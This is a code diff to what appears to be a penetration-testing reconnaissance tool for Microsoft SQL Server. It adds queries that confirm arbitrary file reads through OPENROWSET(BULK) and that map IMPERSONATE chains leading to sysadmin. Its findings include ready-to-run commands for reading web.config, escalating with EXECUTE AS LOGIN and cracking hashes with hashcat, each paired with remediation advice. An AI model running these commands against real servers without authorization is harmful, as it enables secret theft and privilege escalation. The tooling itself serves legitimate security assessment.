@@ -1242,6 +1242,36 @@ _ENUM_SECTIONS = {
     # Startup stored procedures (auto-run as sysadmin at service start - persistence).
     "startup": "SELECT name+'|startup' FROM master.sys.procedures "
                "WHERE OBJECTPROPERTY(object_id,'ExecIsStartup')=1",
+    # Active confirmation of the arbitrary-file-read primitive via OPENROWSET
+    # BULK. Any login holding ADMINISTER BULK OPERATIONS (or sysadmin) can
+    # SELECT the contents of any file the SQL service account can open —
+    # web.config, deploy secrets, private keys. Reading `hosts` is a
+    # universally-present, non-sensitive file that confirms the capability
+    # without exfiltrating anything real. Returned as 'file_read_ok|<64-byte
+    # sample>' so parse_enum can capture both the fact and the proof.
+    "fileread": "BEGIN TRY "
+                "SELECT 'file_read_ok|'+LEFT(CAST(BulkColumn AS varchar(64)),64) "
+                "FROM OPENROWSET(BULK 'C:\\Windows\\System32\\drivers\\etc\\hosts',"
+                "SINGLE_CLOB) AS x "
+                "END TRY BEGIN CATCH SELECT 'file_read_denied|'+ERROR_MESSAGE() "
+                "END CATCH",
+    # Multi-hop impersonation resolver: for every login the current session
+    # can IMPERSONATE, does THAT login hold sysadmin or additional
+    # IMPERSONATE grants? Surface as `grantor|is_sa|onward_impersonations` so
+    # findings can flag "you can hop A -> B -> sysadmin".
+    "impersonate_chain":
+        "SELECT b.name+'|'"
+        "+CAST(IS_SRVROLEMEMBER('sysadmin',b.name) AS varchar(4))+'|'"
+        "+CAST((SELECT COUNT(*) FROM sys.server_permissions p2 "
+        "  JOIN sys.server_principals gr ON p2.grantor_principal_id=gr.principal_id "
+        "  WHERE p2.permission_name='IMPERSONATE' AND gr.name<>b.name "
+        "  AND p2.grantee_principal_id IN (SELECT principal_id FROM "
+        "  sys.server_principals WHERE name=b.name)) AS varchar(4)) "
+        "FROM sys.server_permissions a "
+        "JOIN sys.server_principals b "
+        "ON a.grantor_principal_id=b.principal_id "
+        "WHERE a.permission_name='IMPERSONATE' "
+        "AND a.grantee_principal_id=USER_ID()",
 }
 
 # Server permissions that grant privilege escalation / control without the sysadmin
@@ -1527,6 +1557,73 @@ def chains_from_enum(target: dict, enum: dict, creds: dict | None,
             "impacket-mssqlclient",
             "hashcat -m 1731 mssql_hashes.txt wordlist.txt",
             "Rotate SQL logins; enforce a strong password policy.", ["CWE-522"], kind="hashes"))
+
+    # Active file-read primitive confirmation. The `fileread` enum section
+    # actually runs OPENROWSET(BULK,...) against a universally-present
+    # non-sensitive file (hosts). A `file_read_ok|<sample>` row confirms
+    # the current login can SELECT the contents of any file the SQL service
+    # account can open — web.config, deploy secrets, private keys.
+    fread = enum.get("fileread") or []
+    for row in fread:
+        if not row:
+            continue
+        cell = row[0] if isinstance(row, list) else str(row)
+        if cell.startswith("file_read_ok"):
+            sample = cell.split("|", 1)[1] if "|" in cell else ""
+            fs.append(_finding(
+                "high",
+                "Arbitrary file read via OPENROWSET(BULK) confirmed", tgt,
+                "recce successfully SELECTed the contents of "
+                "C:\\Windows\\System32\\drivers\\etc\\hosts via "
+                "`OPENROWSET(BULK …, SINGLE_CLOB)` with the current login. "
+                "The current session can read ANY file the SQL Server "
+                "service account can open — web.config, connection strings, "
+                "private keys, %APPDATA% secrets. First 64 bytes of proof: "
+                f"{sample!r}",
+                "impacket-mssqlclient",
+                _fill("SELECT * FROM OPENROWSET(BULK "
+                      "'C:\\inetpub\\wwwroot\\web.config', SINGLE_CLOB) AS x",
+                      ctx),
+                "REVOKE ADMINISTER BULK OPERATIONS from the login (and any "
+                "role it inherits from); ensure the SQL service account runs "
+                "under a low-privilege identity with restricted filesystem "
+                "ACLs.",
+                ["CWE-732", "CWE-284"], kind="mssql_openrowset_read"))
+            break
+
+    # Multi-hop impersonation chain: any login the current session can
+    # IMPERSONATE that (a) is itself a sysadmin OR (b) has onward
+    # IMPERSONATE grants of its own → chain to sysadmin.
+    chain_rows = enum.get("impersonate_chain") or []
+    chain_findings = []
+    for row in chain_rows:
+        if len(row) < 3:
+            continue
+        who, is_sa, onward = row[0], row[1] == "1", row[2]
+        try:
+            onward_n = int(onward or "0")
+        except ValueError:
+            onward_n = 0
+        if is_sa:
+            chain_findings.append(f"IMPERSONATE '{who}' (sysadmin) — instant EoP")
+        elif onward_n > 0:
+            chain_findings.append(f"IMPERSONATE '{who}' → holds {onward_n} "
+                                   f"further IMPERSONATE grant(s) (walk to sa)")
+    if chain_findings:
+        fs.append(_finding(
+            "high",
+            "MSSQL impersonation chain to sysadmin available", tgt,
+            "The current login has direct or transitive `EXECUTE AS LOGIN` "
+            "paths that terminate at a sysadmin:\n\n  - "
+            + "\n  - ".join(chain_findings[:8])
+            + (f"\n\n… + {len(chain_findings)-8} more"
+               if len(chain_findings) > 8 else ""),
+            "impacket-mssqlclient",
+            _fill("EXECUTE AS LOGIN = '<target>'; SELECT SYSTEM_USER, "
+                  "IS_SRVROLEMEMBER('sysadmin'); REVERT", ctx),
+            "REVOKE IMPERSONATE ON LOGIN::<sysadmin> from the current login; "
+            "audit `sys.server_permissions` for every IMPERSONATE grant.",
+            ["CWE-269"], kind="mssql_impersonation_chain"))
 
     # Stored credential objects + Agent proxies -> the (often privileged) accounts
     # SQL Server holds a secret for. The identity is readable; the password is
